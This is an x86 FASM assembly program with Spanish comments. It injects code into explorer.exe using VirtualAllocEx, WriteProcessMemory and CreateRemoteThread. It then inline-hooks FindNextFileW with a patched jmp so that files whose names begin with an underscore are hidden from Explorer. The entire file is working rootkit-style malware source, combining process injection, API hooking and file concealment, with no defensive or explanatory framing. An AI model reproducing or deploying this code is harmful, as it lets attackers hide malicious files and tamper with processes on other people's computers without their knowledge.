format pe; console
 entry start
 include 'win32ax.inc'


;-------------Code Seccion---------------------------------
 section '.code' code readable executable

start:
 stdcall GetPID,Proceso

 stdcall Inyectar,addr Proceso,FINFuncion-FuncionInyectada,FuncionInyectada,[GetProcAddress]
 cmp eax,-1
 jne salir
 
 invoke MessageBoxA,0,"No se encontró el proceso!",0,0
 
 salir:
 invoke ExitProcess,0




proc Inyectar,ProcessName,Tamaño,Funcion,Datos
     ;Lazamos el proceso
     invoke OpenProcess,PROCESS_CREATE_THREAD+PROCESS_VM_OPERATION+PROCESS_VM_WRITE,FALSE,[PID]
   mov [hProcess],eax
 
   ;Reservamos espacio en el proceso
   invoke VirtualAllocEx,[hProcess],0,[Tamaño],MEM_COMMIT+MEM_RESERVE,PAGE_EXECUTE_READWRITE
   mov [DirFuncion],eax
 
   ;Escribimos los datos en memoria
   invoke WriteProcessMemory,[hProcess],[DirFuncion],[Funcion],[Tamaño],0
 
   ;Creamos el hilo
   invoke CreateRemoteThread,[hProcess],0,0,[DirFuncion],[Datos],0,0
   popad
   mov eax,1
   ret




endp


proc FuncionInyectada,pGetProcAddress
 
    locals
 BaseKernel32         dd  ?
 OriginalProtection        dd  ?
    endl
 
    ;Leemos el PEB  para obtener la base de KERNEL32.DLL
    xor  eax, eax
    add  eax,[fs:eax+30h]
    mov  eax, [eax + 0ch]
    mov  esi, [eax + 1ch]
    lodsd
    mov  eax, [eax + 08h]
    mov [BaseKernel32],eax
 
    ;Obtenemos la dirección de FindNextFileW
    stdcall [pGetProcAddress],[BaseKernel32],'FindNextFileW'
    mov ebx,eax

 ;Obtenemos la dirección de VirtualProtect
    stdcall [pGetProcAddress],[BaseKernel32],"VirtualProtect"
    stdcall eax,ebx,7,PAGE_EXECUTE_READWRITE,addr OriginalProtection
 
    ;Obtenemos Delta Offset
    call delta
    delta:
    pop edx
    sub edx,delta
    push edx
 
    ;Movemos la direccion de FIndNextFileW
    add edx,dirFindNextFileW
    mov dword[edx],ebx
 
    pop edx
 
    mov ecx,edx
    add ecx,ApiOriginal
    mov al,byte[ebx]
    mov byte[ecx],al
    mov byte[ebx],0xE9  ;0xE9 es igual a jmp
    inc ebx
    inc ecx
 
    mov eax,dword[ebx]
    mov dword[ecx],eax
    mov eax,FuncionHook
    add eax,edx
    sub eax,ebx
    sub eax,4
    mov dword[ebx],eax  ;guardamos en ebx la direccion a la que saltara
 
    add ebx,4
    add ecx,4
 
    mov ax,word[ebx]
    mov word[ecx],ax
 
    mov word[ebx],0x9090
 
    ret
 
    ;7 primeros bytes de la Api FindNextFileW y una rutina para saltar a FindNextFileW+7
    ApiOriginal:
 ;edx=delta
 ;7 nops que cambiaremos en tiempo de ejecución por los 7 primeros bytes de FindNextFileW
 nop
 nop
 nop
 nop
 nop
 nop
 nop
 
 add edx,dirFindNextFileW
 mov eax,dword[edx]
 add eax,7     ;Nos desplazamos 7 bytes
 jmp eax      ;Saltamos a FindNextFileW+7
 

    ;Funcion Hookeada
    proc FuncionHook,hFindFile,lpFindFileData
 Volver:

 call delta2
 delta2:
 pop edx
 sub edx,delta2
 

 push [lpFindFileData]
 push [hFindFile]
 mov ecx,edx
 add ecx,ApiOriginal
 call ecx
 cmp eax,0
 je Retornar
 
 mov ebx,[lpFindFileData]
 add ebx,44

 cmp byte[ebx],'_' ;Comparamos si el file empieza por el caracter _ si es asi saltamos a l inicio y pedimos un siguiente file de lo contrario lo mostramos
 jne Retornar
 jmp Volver
 
 Retornar:
 ret
   endp
;-------------------------------------------------------------------------------------------------------------------------------------------
 
 dirFindNextFileW    dd     ?
endp
 
FINFuncion:

proc GetPID ProcessName

 mov    [pInfo.dwSize],sizeof.PROCESSENTRY32
 invoke CreateToolhelp32Snapshot,2, 0
 mov    [hProcesos], eax

 invoke Process32First,[hProcesos],pInfo
.loop:
 mov    edi,Proceso
 invoke StrStrI,pInfo.szExeFile, edi
 cmp    eax,0
 je     .next
 jmp   get
.next:
 invoke Process32Next,[hProcesos],pInfo
 cmp    eax,0
 jne    .loop
 ccall [printf],'Proceso no encontrado'
 ccall [getchar]
 invoke ExitProcess,0
get:
 push [pInfo.th32ProcessID]
 pop [PID]
 ccall [printf],'%s :%d',addr Proceso,[PID],0Ah
 ccall [getchar]
 ret
endp

;-------------Data Seccion---------------------------------
section '.data' data readable writeable

 struct PROCESSENTRY32
        dwSize dd ?
        cntUsage dd ?
        th32ProcessID dd ?
        th32DefaultHeapID dd ?
        th32ModuleID dd ?
        cntThreads dd ?
        th32ParentProcessID dd ?
        pcPriClassBase dd ?
        dwFlags dd ?
        szExeFile rb MAX_PATH
 ends

 struct Datos
        sBufferCall dd ?
 ends

 dat Datos ?
 pInfo PROCESSENTRY32 ?
 hProcesos dd ?
 Proceso db 'explorer.exe',0
 Handle         dd          ?
       PID         dd          ?
       DirFuncion        dd          ?
       hProcess         dd          ?
       Tamaño dd ?





;-------------Import Data Seccion---------------------------------
section '.idata' import data readable writeable
library msvcrt, 'msvcrt.dll', kernel32, 'kernel32.dll',advapi32,'ADVAPI32.DLL',shell32,'SHELL32.DLL',user32,'user32.dll'
import msvcrt, printf, 'printf', getchar,'getchar', scanf,'scanf'


include 'API\shell32.inc'
include 'API\kernel32.inc'
include 'API\USER32.INC'
